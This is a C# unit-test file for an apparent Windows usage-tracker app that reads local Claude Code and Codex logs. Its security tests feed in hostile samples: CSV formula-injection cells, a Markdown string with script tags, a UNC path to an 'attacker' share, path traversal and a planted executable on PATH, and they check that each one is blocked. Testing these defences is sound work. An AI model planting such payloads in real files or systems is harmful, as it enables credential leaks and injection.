using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace AIUsageBar.Tests
{
    public static partial class TestMain
    {
        static int failures;
        static int passes;

        static void Check(bool ok, string name, string detail = null)
        {
            if (ok) { passes++; Console.WriteLine("  PASS  " + name); }
            else { failures++; Console.WriteLine("  FAIL  " + name + (detail != null ? "  → " + detail : "")); }
        }

        static void Eq(long expected, long actual, string name)
        {
            Check(expected == actual, name, "expected " + expected + ", actual " + actual);
        }

        public static int Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            string mode = args.Length > 0 ? args[0] : "--unit";
            try
            {
                if (mode == "--unit") { Unit(); FriendsUnit(); ResetUnit(); }
                else if (mode == "--render-friends") { RenderFriends(args[1]); return 0; }
                else if (mode == "--live") Live(args.Length > 1 ? args[1] : null);
                else if (mode == "--render") Render(args[1], args[2]);
                else if (mode == "--compat") Compat(args[1], args[2]);
                else if (mode == "--team") TeamUnit();
                else if (mode == "--render-team") RenderTeam(args[1]);
                else if (mode == "--team-demo") return TeamDemo(args[1], args[2], args[3]);
                else if (mode == "--mac-bridge") return MacBridge(args);
                else if (mode == "--ai-check") return AiCheck();
                else if (mode == "--spawn-job-child") { SpawnJobChild(args[1]); return 0; }
                else { Console.WriteLine("usage: tests --unit | --live <dataDir>"); return 2; }
            }
            catch (Exception ex)
            {
                Console.WriteLine("EXCEPTION: " + ex);
                return 3;
            }
            Console.WriteLine();
            Console.WriteLine("結果: " + passes + " passed, " + failures + " failed");
            return failures == 0 ? 0 : 1;
        }

        // ================================================================ 合成データ

        static string Tmp()
        {
            string d = Path.Combine(Path.GetTempPath(), "aiub-test-" + Guid.NewGuid().ToString("N").Substring(0, 8));
            Directory.CreateDirectory(d);
            return d;
        }

        static AppPaths FakePaths(string root)
        {
            var p = new AppPaths();
            p.Home = root;
            p.LocalAppData = Path.Combine(root, "Local");
            p.RoamingAppData = Path.Combine(root, "Roaming");
            p.DataDir = Path.Combine(root, "data");
            p.ClaudeProjects = Path.Combine(root, ".claude", "projects");
            p.CodexHome = Path.Combine(root, ".codex");
            p.ClaudeHistoryCandidates.Add(Path.Combine(root, "Roaming", "Claude", "plan-usage-history.json"));
            p.ClaudeHistoryCandidates.Add(Path.Combine(root, "Local", "Packages", "Claude_x", "LocalCache", "Roaming", "Claude", "plan-usage-history.json"));
            return p;
        }

        static string Iso(DateTime utc) { return utc.ToString("yyyy-MM-dd'T'HH:mm:ss.fff'Z'"); }

        static string ClaudeAssistant(string sid, string msgId, string reqId, DateTime t, long inp, long outp, long cr, long cw, string contentText = "hello")
        {
            return "{\"parentUuid\":\"p\",\"isSidechain\":false,\"message\":{\"model\":\"claude-opus-5\",\"id\":\"" + msgId + "\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[{\"type\":\"text\",\"text\":\"" + contentText + "\"}],\"usage\":{\"input_tokens\":" + inp + ",\"cache_creation_input_tokens\":" + cw + ",\"cache_read_input_tokens\":" + cr + ",\"output_tokens\":" + outp + "}},\"requestId\":\"" + reqId + "\",\"type\":\"assistant\",\"uuid\":\"u-" + msgId + "\",\"timestamp\":\"" + Iso(t) + "\",\"cwd\":\"C:\\\\work\\\\proj\",\"sessionId\":\"" + sid + "\"}";
        }

        static string ClaudeUser(string sid, DateTime t, string text, bool meta = false)
        {
            return "{\"parentUuid\":null,\"isSidechain\":false,\"promptId\":\"x\",\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":" + Json.Serialize(text) + "}," + (meta ? "\"isMeta\":true," : "") + "\"uuid\":\"uu\",\"timestamp\":\"" + Iso(t) + "\",\"origin\":{\"kind\":\"human\"},\"cwd\":\"C:\\\\work\\\\proj\",\"sessionId\":\"" + sid + "\"}";
        }

        static string ClaudeToolResult(string sid, DateTime t)
        {
            return "{\"parentUuid\":\"a\",\"isSidechain\":false,\"promptId\":\"x\",\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":[{\"tool_use_id\":\"toolu_1\",\"type\":\"tool_result\",\"content\":\"" + new string('x', 5000) + "\"}]},\"uuid\":\"tr\",\"timestamp\":\"" + Iso(t) + "\",\"sessionId\":\"" + sid + "\"}";
        }

        static string CodexMeta(string id, DateTime t, string parent = null)
        {
            string source = parent == null ? "\"vscode\"" : "{\"subagent\":{\"thread_spawn\":{\"parent_thread_id\":\"" + parent + "\",\"depth\":1,\"agent_nickname\":\"Newton\"}}}";
            return "{\"timestamp\":\"" + Iso(t) + "\",\"ordinal\":0,\"type\":\"session_meta\",\"payload\":{\"session_id\":\"" + id + "\",\"id\":\"" + id + "\",\"timestamp\":\"" + Iso(t) + "\",\"cwd\":\"C:\\\\work\\\\codexproj\",\"originator\":\"Codex Desktop\",\"cli_version\":\"0.153.4\",\"source\":" + source + ",\"thread_source\":\"" + (parent == null ? "user" : "subagent") + "\",\"base_instructions\":{\"text\":\"" + new string('b', 3000) + "\"}}}";
        }

        static string CodexUserMsg(DateTime t, string text)
        {
            return "{\"timestamp\":\"" + Iso(t) + "\",\"ordinal\":5,\"type\":\"response_item\",\"payload\":{\"type\":\"message\",\"id\":\"msg_1\",\"role\":\"user\",\"content\":[{\"type\":\"input_text\",\"text\":" + Json.Serialize(text) + "}]}}";
        }

        static string CodexRecord(string thread, string resp, DateTime t, long inp, long cached, long outp, long reasoning)
        {
            return "{\"timestamp\":\"" + Iso(t) + "\",\"ordinal\":15,\"type\":\"token_usage_record\",\"payload\":{\"thread_id\":\"" + thread + "\",\"response_id\":\"" + resp + "\",\"usage\":{\"input_tokens\":" + inp + ",\"cached_input_tokens\":" + cached + ",\"cache_write_input_tokens\":0,\"output_tokens\":" + outp + ",\"reasoning_output_tokens\":" + reasoning + ",\"total_tokens\":" + (inp + outp) + "}}}";
        }

        static string CodexCount(DateTime t, long total, long last)
        {
            return "{\"timestamp\":\"" + Iso(t) + "\",\"ordinal\":18,\"type\":\"event_msg\",\"payload\":{\"type\":\"token_count\",\"info\":{\"total_token_usage\":{\"input_tokens\":" + (total - 10) + ",\"cached_input_tokens\":0,\"output_tokens\":10,\"reasoning_output_tokens\":0,\"total_tokens\":" + total + "},\"last_token_usage\":{\"input_tokens\":" + (last - 10) + ",\"cached_input_tokens\":0,\"output_tokens\":10,\"reasoning_output_tokens\":0,\"total_tokens\":" + last + "}}}}";
        }

        static void WriteLines(string path, params string[] lines)
        {
            Directory.CreateDirectory(Path.GetDirectoryName(path));
            File.WriteAllText(path, string.Join("\n", lines) + "\n", new UTF8Encoding(false));
        }

        static void AppendLines(string path, params string[] lines)
        {
            File.AppendAllText(path, string.Join("\n", lines) + "\n", new UTF8Encoding(false));
        }

        static void Unit()
        {
            Console.WriteLine("== JSON");
            {
                var o = Json.Parse("{\"a\":[1,2.5,\"x\\u3042\\n\"],\"b\":{\"c\":null,\"d\":true},\"big\":12345678901234}");
                Eq(12345678901234, Json.Long(o, "big").Value, "long値");
                Check(((List<object>)((Dictionary<string, object>)o)["a"])[2] as string == "xあ\n", "エスケープ");
                var round = Json.Parse(Json.Serialize(o));
                Check(Json.Serialize(round) == Json.Serialize(o), "往復");
                Check(Json.TryParse("{\"a\":") == null, "壊れたJSONはnull");
            }

            Console.WriteLine("== Codex app-server 応答の解析");
            {
                var result = Json.Parse("{\"ordinaryUsageAllowed\":true,\"rateLimits\":{\"limitId\":\"codex\",\"primary\":{\"usedPercent\":64,\"windowDurationMins\":10080,\"resetsAt\":1789805902},\"secondary\":null,\"planType\":\"pro\"},\"rateLimitsByLimitId\":{\"codex\":{\"limitId\":\"codex\",\"limitName\":null,\"primary\":{\"usedPercent\":64,\"windowDurationMins\":10080,\"resetsAt\":1789805902},\"secondary\":{\"usedPercent\":12.5,\"windowDurationMins\":300,\"resetsAt\":1789621236},\"planType\":\"pro\"},\"codex_bengalfox\":{\"limitId\":\"codex_bengalfox\",\"limitName\":\"GPT-5.3-Codex-Spark\",\"primary\":{\"usedPercent\":0,\"windowDurationMins\":300,\"resetsAt\":1789621236},\"secondary\":null}}}");
                // The fixture reset times are fixed; its observation clock must
                // be fixed too, otherwise this test expires as calendar time passes.
                var fixtureNow = Fmt.FromUnixSeconds(1789621236 - 60);
                var s = CodexClient.ParseRateLimits(result, fixtureNow);
                Eq(2, s.Main.Windows.Count, "codex枠は2つ");
                Check(s.Main.Windows[0].Label == "5時間" && s.Main.Windows[1].Label == "週間", "5時間→週間の順");
                Check(Math.Abs(s.Main.Windows[0].RemainingPercent - 87.5) < 0.001, "残り割合 = 100 - 使用率");
                Check(s.PlanType == "pro", "プラン");
                Eq(1, s.Others.Count, "他のモデル枠");
                Check(s.Others[0].Title == "GPT-5.3-Codex-Spark", "他の枠の名前");
                var daily = CodexClient.ParseDaily(Json.Parse("{\"dailyUsageBuckets\":[{\"startDate\":\"2026-09-16\",\"tokens\":5622280}]}"));
                Eq(5622280, daily[0].Tokens, "日別トークン");
                var back = CodexSnapshot.FromJson(Json.Parse(Json.Serialize(s.ToJson())));
                Check(back.Main.Windows.Count == 2 && back.Others.Count == 1 && back.Main.Windows[1].ResetsAtUtc == s.Main.Windows[1].ResetsAtUtc, "スナップショットの保存と復元");

                string root = Tmp();
                var store = new UsageStore(FakePaths(root), new Settings(), null);
                store.Codex = s;
                double? min = store.CodexMinRemaining(fixtureNow);
                Check(min != null, "取得直後は表示する");
                s.ObservedAtUtc = fixtureNow.AddHours(-1);
                Check(store.CodexMinRemaining(fixtureNow) == null, "1時間前の情報は古い扱い（灰色）");
                var afterReset = Fmt.FromUnixSeconds(1789621236 + 10);
                s.ObservedAtUtc = afterReset.AddMinutes(-1);
                Check(store.CodexMinRemaining(afterReset) == 36, "5時間枠だけリセット後なら週間枠で表示", "" + store.CodexMinRemaining(afterReset));
                Check(UsageStore.LevelFor(20.1) == Level.Good && UsageStore.LevelFor(20) == Level.Warn && UsageStore.LevelFor(10) == Level.Danger && UsageStore.LevelFor(null) == Level.Unknown, "色の境界 20%超/20%以下/10%以下");
                try { CodexClient.Fetch(null, TimeSpan.FromSeconds(1), null); Check(false, "CLIなし"); }
                catch (CodexException ex) { Check(ex.Message == CodexClient.MsgNotFound, "CLIが無いときのメッセージ"); }
            }

            Console.WriteLine("== Claude Desktop 保存履歴");
            {
                string root = Tmp();
                var paths = FakePaths(root);
                string err;
                Check(ClaudeUsage.Read(paths, out err) == null && err == ClaudeUsage.MsgNoFile, "ファイルが無い");
                long now = Fmt.ToUnixMs(DateTime.UtcNow);
                string f1 = paths.ClaudeHistoryCandidates[1];
                Directory.CreateDirectory(Path.GetDirectoryName(f1));
                File.WriteAllText(f1, "{\"version\":2,\"samples\":[{\"t\":" + (now - 3600000) + ",\"org\":\"a\",\"u\":{\"fh\":90,\"sd\":50}},{\"t\":" + (now - 60000) + ",\"org\":\"b\",\"u\":{\"fh\":12,\"sd\":24}},{\"t\":" + (now - 120000) + ",\"org\":\"a\",\"u\":{\"fh\":99,\"sd\":99}}]}");
                var c = ClaudeUsage.Read(paths, out err);
                Check(c != null && c.FiveHourRemaining == 88 && c.WeeklyRemaining == 76, "最新サンプルを使う（順不同でも）");
                Check(c.MinRemaining == 76, "少ない方を表示");
                Check(!c.IsStale(DateTime.UtcNow), "1分前は新しい");
                Check(c.IsStale(DateTime.UtcNow.AddMinutes(20)), "約20分後は古い");
                Check(!c.IsStale(DateTime.UtcNow.AddMinutes(40), 30) && c.IsStale(DateTime.UtcNow.AddMinutes(50), 30), "確認間隔30分なら約45分までは古い扱いにしない");
                File.WriteAllText(f1, "{\"version\":2,\"samples\":[]}");
                Check(ClaudeUsage.Read(paths, out err) == null && err == ClaudeUsage.MsgNoSamples, "サンプルなし");
                File.WriteAllText(f1, "{broken");
                Check(ClaudeUsage.Read(paths, out err) == null && err == ClaudeUsage.MsgFormat, "壊れたファイル");
            }

            Console.WriteLine("== Claude Code ローカル記録");
            {
                string root = Tmp();
                var paths = FakePaths(root);
                var now = DateTime.UtcNow.AddMinutes(-30);
                string sid = "11111111-2222-3333-4444-555555555555";
                string file = Path.Combine(paths.ClaudeProjects, "C--work-proj", sid + ".jsonl");
                WriteLines(file,
                    "{\"type\":\"custom-title\",\"customTitle\":\"テスト作業\",\"sessionId\":\"" + sid + "\"}",
                    ClaudeUser(sid, now, "ログ集計を作って"),
                    ClaudeUser(sid, now.AddSeconds(1), "<command-name>/clear</command-name>"),
                    ClaudeUser(sid, now.AddSeconds(2), "meta", true),
                    // 作業中に送ったメッセージ（予約入力）と、同じ内容の通常入力 → 1件
                    "{\"parentUuid\":\"p\",\"isSidechain\":false,\"attachment\":{\"type\":\"queued_command\",\"prompt\":\"出力はDownloadsへ\",\"commandMode\":\"prompt\",\"origin\":{\"kind\":\"human\"}},\"type\":\"attachment\",\"uuid\":\"q1\",\"timestamp\":\"" + Iso(now.AddSeconds(3)) + "\",\"sessionId\":\"" + sid + "\"}",
                    ClaudeUser(sid, now.AddSeconds(4), "出力はDownloadsへ"),
                    // 同じ応答が2行（ストリーミング）→ 1回だけ数える
                    ClaudeAssistant(sid, "msg_A", "req_A", now.AddSeconds(5), 10, 100, 1000, 500, "part1"),
                    ClaudeAssistant(sid, "msg_A", "req_A", now.AddSeconds(6), 10, 120, 1000, 500, "part2"),
                    ClaudeToolResult(sid, now.AddSeconds(7)),
                    ClaudeAssistant(sid, "msg_B", "req_B", now.AddSeconds(9), 3, 7, 2000, 0, "done \\\"usage\\\":{\\\"input_tokens\\\":999999}"),
                    // 範囲外（20日前）は数えない
                    ClaudeAssistant(sid, "msg_OLD", "req_OLD", DateTime.UtcNow.AddDays(-20), 1, 1, 1, 1));
                // サブエージェントのログは親セッションに合算
                string sub = Path.Combine(paths.ClaudeProjects, "C--work-proj", sid, "subagents", "agent-abc.jsonl");
                WriteLines(sub,
                    "{\"parentUuid\":null,\"isSidechain\":true,\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":\"調査して\"},\"timestamp\":\"" + Iso(now.AddSeconds(10)) + "\",\"sessionId\":\"" + sid + "\"}",
                    ClaudeAssistant(sid, "msg_S", "req_S", now.AddSeconds(11), 1, 2, 3, 4).Replace("\"isSidechain\":false", "\"isSidechain\":true"));

                var logs = new LocalLogs(paths);
                logs.Scan(null);
                var day = now.ToLocalTime().Date;
                var sum = logs.DayTotal(Tool.ClaudeCode, day);
                Eq(10 + 3 + 1, sum.Input, "入力（重複除去）");
                Eq(120 + 7 + 2, sum.Output, "出力は同じ応答の最大値");
                Eq(1000 + 2000 + 3, sum.CacheRead, "キャッシュ読み取り");
                Eq(500 + 0 + 4, sum.CacheWrite, "キャッシュ作成");
                Eq(3, sum.Responses, "応答数（本文中の\"usage\"文字列に惑わされない）");
                var views = logs.SessionsForDay(day);
                Eq(1, views.Count, "セッションは1件（サブエージェントは親に合算）");
                Eq(2, views[0].PromptsInDay, "依頼は2件（作業中の追加メッセージを含む・重複と コマンド・メタ・ツール結果・サブエージェントを除外）");
                Check(logs.ReadPrompt(Tool.ClaudeCode, logs.PromptsForDay(views[0].Info, day)[1]) == "出力はDownloadsへ", "作業中に送ったメッセージの本文");
                Check(logs.ReadTitle(views[0].Info, null) == "テスト作業", "タイトル");
                Check(logs.ReadPrompt(Tool.ClaudeCode, logs.FirstPrompt(views[0].Info)) == "ログ集計を作って", "最初の依頼文");
                Check(views[0].Info.Cwd == "C:\\work\\proj", "作業フォルダ");

                // 差分読み取り：追記分だけ加算され、二重計上しない
                logs.Save();
                var logs2 = new LocalLogs(paths);
                logs2.Load();
                AppendLines(file, ClaudeAssistant(sid, "msg_C", "req_C", now.AddSeconds(20), 1, 1, 1, 1));
                // 書き込み途中の行（改行なし）は次回に回す
                File.AppendAllText(file, ClaudeAssistant(sid, "msg_D", "req_D", now.AddSeconds(21), 1000, 1000, 0, 0).Substring(0, 120));
                logs2.Scan(null);
                Eq(3 + 1, logs2.DayTotal(Tool.ClaudeCode, day).Responses, "追記の差分読み取り（途中行は除外）");
                Check(logs2.ExaminedFiles == 1, "変更のないファイルは読まない", "examined=" + logs2.ExaminedFiles);
                File.AppendAllText(file, ClaudeAssistant(sid, "msg_D", "req_D", now.AddSeconds(21), 1000, 1000, 0, 0).Substring(120) + "\n");
                logs2.Scan(null);
                Eq(5, logs2.DayTotal(Tool.ClaudeCode, day).Responses, "途中行が完成したら数える");
                Eq(10 + 3 + 1 + 1 + 1000, logs2.DayTotal(Tool.ClaudeCode, day).Input, "差分後の入力合計");

                // キャッシュに本文が入っていない
                string cache = File.ReadAllText(Path.Combine(paths.DataDir, "local-logs-v4.json"));
                Check(!cache.Contains("ログ集計を作って") && !cache.Contains("テスト作業") && !cache.Contains("part1"), "キャッシュに会話本文・タイトルを保存しない");

                // ファイルが短くなったら読み直す
                WriteLines(file, ClaudeAssistant(sid, "msg_A", "req_A", now.AddSeconds(5), 10, 120, 1000, 500));
                logs2.Scan(null);
                Eq(2, logs2.DayTotal(Tool.ClaudeCode, day).Responses, "書き換えで短くなったら全体を読み直す（本体1＋サブ1）");
            }

            Console.WriteLine("== Codex ローカル記録");
            {
                string root = Tmp();
                var paths = FakePaths(root);
                var now = DateTime.UtcNow.AddMinutes(-30);
                string id = "01a090bc-585f-7e60-a67d-72ef32961799";
                string child = "01a09dfa-95cb-7140-8d4a-e6e1a48d6356";
                string dir = Path.Combine(paths.CodexHome, "sessions", now.ToString("yyyy"), now.ToString("MM"), now.ToString("dd"));
                string f = Path.Combine(dir, "rollout-2026-09-11T22-50-57-" + id + ".jsonl");
                WriteLines(f,
                    CodexMeta(id, now),
                    CodexUserMsg(now.AddSeconds(1), "<recommended_plugins>\nHere is a list"),
                    CodexUserMsg(now.AddSeconds(1), "# AGENTS.md instructions for C:\\x"),
                    CodexUserMsg(now.AddSeconds(2), "会社名を考えて"),
                    "{\"timestamp\":\"" + Iso(now.AddSeconds(2)) + "\",\"ordinal\":7,\"type\":\"turn_context\",\"payload\":{\"cwd\":\"C:\\\\work\\\\codexproj\",\"model\":\"gpt-5.6-sol\"}}",
                    CodexRecord(id, "resp_1", now.AddSeconds(3), 32564, 19072, 309, 62),
                    CodexCount(now.AddSeconds(3), 32873, 32873),
                    CodexRecord(id, "resp_2", now.AddSeconds(4), 34615, 32384, 293, 85),
                    CodexRecord(id, "resp_2", now.AddSeconds(4), 34615, 32384, 293, 85), // 重複
                    CodexCount(now.AddSeconds(4), 67781, 34908),
                    CodexCount(now.AddSeconds(5), 67781, 34908),
                    CodexUserMsg(now.AddSeconds(6), "# Files mentioned by the user:\n\n## a.png: C:\\a.png\n\n## My request for Codex:\n画像を直して"));
                string fc = Path.Combine(dir, "rollout-2026-09-11T23-00-00-" + child + ".jsonl");
                WriteLines(fc, CodexMeta(child, now.AddSeconds(10), id), CodexUserMsg(now.AddSeconds(10), "調査タスク"), CodexRecord(child, "resp_c1", now.AddSeconds(11), 1000, 500, 50, 10));
                // 旧形式（token_usage_record なし）：累計の差分・リセット・重複
                string old = "01a0aaaa-0000-7000-8000-000000000001";
                string fo = Path.Combine(dir, "rollout-2026-09-12T00-00-00-" + old + ".jsonl");
                WriteLines(fo, CodexMeta(old, now), CodexUserMsg(now.AddSeconds(1), "古い形式"),
                    CodexCount(now.AddSeconds(2), 100, 100), CodexCount(now.AddSeconds(3), 100, 100),
                    CodexCount(now.AddSeconds(4), 250, 150), CodexCount(now.AddSeconds(5), 40, 40));

                string idx = Path.Combine(paths.CodexHome, "session_index.jsonl");
                WriteLines(idx, "{\"id\":\"" + id + "\",\"thread_name\":\"古い名前\",\"updated_at\":\"x\"}", "{\"id\":\"" + id + "\",\"thread_name\":\"会社名の検討\",\"updated_at\":\"y\"}");

                var logs = new LocalLogs(paths);
                logs.Scan(null);
                var day = now.ToLocalTime().Date;
                var sum = logs.DayTotal(Tool.Codex, day);
                Eq(32564 + 34615 + 1000 + 0, sum.Input - 90 - 140 - 30, "入力（response_id単位で重複除去）");
                Eq(309 + 293 + 50 + 30, sum.Output, "出力");
                Eq(62 + 85 + 10, sum.Reasoning, "推論出力");
                Eq(19072 + 32384 + 500, sum.CacheRead, "キャッシュ済み入力");
                Eq(32873 + 34908 + 1050 + 100 + 150 + 40, sum.Total, "合計（旧形式は累計差分・リセット対応）");
                var views = logs.SessionsForDay(day);
                Eq(2, views.Count, "親セッション＋旧形式セッション（子は親に合算）");
                var main = views.First(v => v.Info.Id == id);
                Eq(1, main.Subagents.Count, "サブエージェント1件");
                Eq(32873 + 34908 + 1050, main.Tokens.Total, "親の合計にサブエージェントを含む");
                Eq(2, main.PromptsInDay, "依頼は2件（システム挿入文を除外）");
                Check(main.Info.Model == "gpt-5.6-sol", "モデル");
                var index = logs.ReadCodexIndex();
                Check(logs.ReadTitle(main.Info, index) == "会社名の検討", "session_index の最新のタイトル");
                var prompts = logs.PromptsForDay(main.Info, day);
                Check(logs.ReadPrompt(Tool.Codex, prompts[0]) == "会社名を考えて", "依頼文");
                Check(logs.ReadPrompt(Tool.Codex, prompts[1]) == "画像を直して", "添付付きの依頼は本人の依頼部分だけ");
                Check(views.First(v => v.Info.Id == old).Estimated, "旧形式は推定表示");
            }

            Console.WriteLine("== 設定");
            {
                string dir = Tmp();
                var st = new Settings { CodexIntervalMinutes = 15, ClaudeIntervalMinutes = 60, NotificationsEnabled = true, ShowInTaskbar = false };
                st.Save(dir);
                var back = Settings.Load(dir);
                Check(back.CodexIntervalMinutes == 15 && back.ClaudeIntervalMinutes == 60 && back.NotificationsEnabled && !back.ShowInTaskbar, "設定の保存と読み込み（Codex・Claudeの間隔）");
                File.WriteAllText(Path.Combine(dir, "settings.json"), "{\"claudeIntervalMinutes\":0,\"codexIntervalMinutes\":-5}");
                back = Settings.Load(dir);
                Check(back.ClaudeIntervalMinutes == 1 && back.CodexIntervalMinutes == 5, "不正な間隔は初期値に戻す（0分で連続実行しない）");
            }

            Console.WriteLine("== セキュリティ");
            {
                // 数値・時刻の異常値で落ちない
                Check(Json.TryParse("{\"a\":1e999}") == null, "範囲外の数値は不正なJSONとして扱う");
                try { Fmt.FromUnixMs(1700000000000000000L); Check(false, "範囲外の時刻"); }
                catch (FormatException) { Check(true, "範囲外の時刻は FormatException"); }
                {
                    string root = Tmp();
                    var paths = FakePaths(root);
                    string f = paths.ClaudeHistoryCandidates[0];
                    Directory.CreateDirectory(Path.GetDirectoryName(f));
                    long now = Fmt.ToUnixMs(DateTime.UtcNow);
                    File.WriteAllText(f, "{\"samples\":[{\"t\":1700000000000000000,\"u\":{\"fh\":1,\"sd\":1}},{\"t\":" + now + ",\"u\":{\"fh\":10,\"sd\":20}}]}");
                    string err;
                    var c = ClaudeUsage.Read(paths, out err);
                    Check(c != null && c.FiveHourRemaining == 90, "Claude履歴の異常な時刻は無視して起動を続ける", err);
                    File.WriteAllText(f, "{\"samples\":[{\"t\":1e999,\"u\":{\"fh\":1}}]}");
                    c = ClaudeUsage.Read(paths, out err);
                    Check(c == null && err == ClaudeUsage.MsgFormat, "Claude履歴の範囲外の数値は形式エラー（例外で落ちない）");
                    var rl = Json.Parse("{\"rateLimits\":{\"limitId\":\"codex\",\"primary\":{\"usedPercent\":10,\"windowDurationMins\":300,\"resetsAt\":99999999999999}}}");
                    var snap = CodexClient.ParseRateLimits(rl, DateTime.UtcNow);
                    Check(snap.Main.Windows[0].ResetsAtUtc == null, "Codexの範囲外のリセット時刻は未取得扱い");
                }

                // CSV・Markdown の無害化
                Check(Hardening.CsvCell("=HYPERLINK(\"http://x\")") == "\"'=HYPERLINK(\"\"http://x\"\")\"", "CSV：= で始まるセルは ' を付けて引用", Hardening.CsvCell("=HYPERLINK(\"http://x\")"));
                Check(Hardening.CsvCell("+1") == "\"'+1\"" && Hardening.CsvCell("-1") == "\"'-1\"" && Hardening.CsvCell("@x") == "\"'@x\"", "CSV：+ - @ も無害化");
                Check(Hardening.CsvCell("普通,の\"文\"") == "\"普通,の\"\"文\"\"\"", "CSV：常に引用符で囲む");
                string md = Hardening.MdInline("<script>alert(1)</script>\n## 偽の見出し ![](http://t/x.png) [link](http://x)");
                Check(!md.Contains("<script>") && !md.Contains("\n") && !md.Contains("![](") && !md.Contains("[link]("), "Markdown：HTML・改行・画像・リンクを無効化", md);
                string fence = Hardening.MdFence("```\n<img src=x>\n```", "");
                Check(fence.StartsWith("````text") && fence.TrimEnd().EndsWith("````"), "Markdown：本文は中の ``` より長い囲みに入れる", fence);

                // HMAC：素のハッシュを保存しない・鍵が違えば値も違う
                {
                    string root = Tmp();
                    Hardening.ResetKeyForTests();
                    string a1 = Hardening.PromptHmac(root, "yes");
                    string a2 = Hardening.PromptHmac(root, "yes");
                    Hardening.ResetKeyForTests();
                    string b1 = Hardening.PromptHmac(Tmp(), "yes");
                    string sha1;
                    using (var sha = System.Security.Cryptography.SHA1.Create()) sha1 = BitConverter.ToString(sha.ComputeHash(Encoding.UTF8.GetBytes("yes")), 0, 6).Replace("-", "").ToLowerInvariant();
                    Check(a1 == a2 && a1 != b1 && !a1.StartsWith(sha1), "HMAC：同じ端末では同じ値、別の鍵では別の値、素のSHA1ではない");
                    byte[] keyFile = File.ReadAllBytes(Path.Combine(root, "hash-key.bin"));
                    Check(keyFile.Length > 32, "HMAC鍵はDPAPIで保護して保存（生の32バイトではない）", "len=" + keyFile.Length);
                    Hardening.ResetKeyForTests();
                }

                // キャッシュ改ざん：ログフォルダ外のファイルは読まない
                {
                    string root = Tmp();
                    var paths = FakePaths(root);
                    var logs = new LocalLogs(paths);
                    string outside = Path.Combine(root, "secret.jsonl");
                    File.WriteAllText(outside, "{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":\"SECRET\"}}\n");
                    Check(logs.ReadPrompt(Tool.ClaudeCode, new LineRef { Path = outside, Offset = 0 }) == null, "ログフォルダ外を指す位置情報は読まない");
                    Check(logs.ReadPrompt(Tool.ClaudeCode, new LineRef { Path = @"\\attacker\share\x.jsonl", Offset = 0 }) == null, "UNCパスは読まない（NTLM送信の防止）");
                    string inside = Path.Combine(paths.ClaudeProjects, "p", "s.jsonl");
                    Directory.CreateDirectory(Path.GetDirectoryName(inside));
                    File.WriteAllText(inside, "{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":\"OK\"}}\n");
                    Check(logs.ReadPrompt(Tool.ClaudeCode, new LineRef { Path = inside, Offset = 0 }) == "OK", "ログフォルダ内は読む");
                    Check(logs.ReadPrompt(Tool.ClaudeCode, new LineRef { Path = Path.Combine(paths.ClaudeProjects, "..", "..", "secret.jsonl"), Offset = 0 }) == null, ".. でログフォルダ外に出るパスは読まない");
                }

                // PATHの相対パスにある codex.exe を使わない
                {
                    string root = Tmp();
                    string cwd = Tmp();
                    File.WriteAllText(Path.Combine(cwd, "codex.exe"), "fake");
                    string oldPath = Environment.GetEnvironmentVariable("PATH");
                    string oldCwd = Environment.CurrentDirectory;
                    try
                    {
                        Environment.CurrentDirectory = cwd;
                        Environment.SetEnvironmentVariable("PATH", ".;codex-bin;" + Environment.SystemDirectory);
                        Check(CodexClient.FindCli(FakePaths(root)) == null, "PATH の相対パス（. など）にある codex.exe は使わない");
                        Environment.SetEnvironmentVariable("PATH", cwd + ";" + Environment.SystemDirectory);
                        Check(CodexClient.FindCli(FakePaths(root)) == Path.Combine(cwd, "codex.exe"), "PATH の絶対パスにある codex.exe は使う");
                    }
                    finally
                    {
                        Environment.CurrentDirectory = oldCwd;
                        Environment.SetEnvironmentVariable("PATH", oldPath);
                    }
                }

                // 外部プログラムは絶対パス
                Check(Path.IsPathRooted(Hardening.ExplorerPath) && Path.IsPathRooted(Hardening.TaskkillPath) && Path.IsPathRooted(Hardening.CmdPath), "explorer / taskkill / cmd は絶対パス");
                Check(File.Exists(Hardening.ExplorerPath) && File.Exists(Hardening.TaskkillPath) && File.Exists(Hardening.CmdPath), "絶対パスの先に実在する");

                // 実行場所の判定
                string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                Check(Hardening.IsRiskyLocation(Path.Combine(home, "Downloads", "x.exe")), "Downloads は注意が必要な場所");
                Check(Hardening.IsRiskyLocation(Path.Combine(Path.GetTempPath(), "x.exe")), "一時フォルダは注意が必要な場所");
                Check(!Hardening.IsRiskyLocation(Path.Combine(Hardening.RecommendedInstallDir, "AIUsageBar.exe")), "推奨の場所は問題なし");
                Check(!Hardening.IsUnder(Path.Combine(home, "Downloads2", "x"), Path.Combine(home, "Downloads")), "フォルダ名の前方一致を配下と誤判定しない");

                // 保存先のアクセス権
                {
                    string dir = Path.Combine(Tmp(), "data");
                    Hardening.SecureDirectory(dir);
                    var acl = Directory.GetAccessControl(dir);
                    var sids = acl.GetAccessRules(true, true, typeof(System.Security.Principal.SecurityIdentifier))
                        .Cast<System.Security.AccessControl.FileSystemAccessRule>().Select(r => r.IdentityReference.Value).Distinct().ToList();
                    var me = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;
                    Check(acl.AreAccessRulesProtected && sids.Count == 3 && sids.Contains(me) && sids.Contains("S-1-5-18") && sids.Contains("S-1-5-32-544"),
                        "保存先は継承なしで 本人・SYSTEM・Administrators のみ", string.Join(",", sids));
                    File.WriteAllText(Path.Combine(dir, "f.json"), "{}");
                    var fsids = File.GetAccessControl(Path.Combine(dir, "f.json")).GetAccessRules(true, true, typeof(System.Security.Principal.SecurityIdentifier))
                        .Cast<System.Security.AccessControl.FileSystemAccessRule>().Select(r => r.IdentityReference.Value).Distinct().Count();
                    Eq(3, fsids, "保存先に作ったファイルも同じアクセス権");
                }

                // ポリシー
                {
                    string root = Tmp();
                    var paths = FakePaths(root);
                    var now = DateTime.UtcNow.AddMinutes(-10);
                    string sid = "99999999-2222-3333-4444-555555555555";
                    string file = Path.Combine(paths.ClaudeProjects, "C--secret-customer", sid + ".jsonl");
                    WriteLines(file,
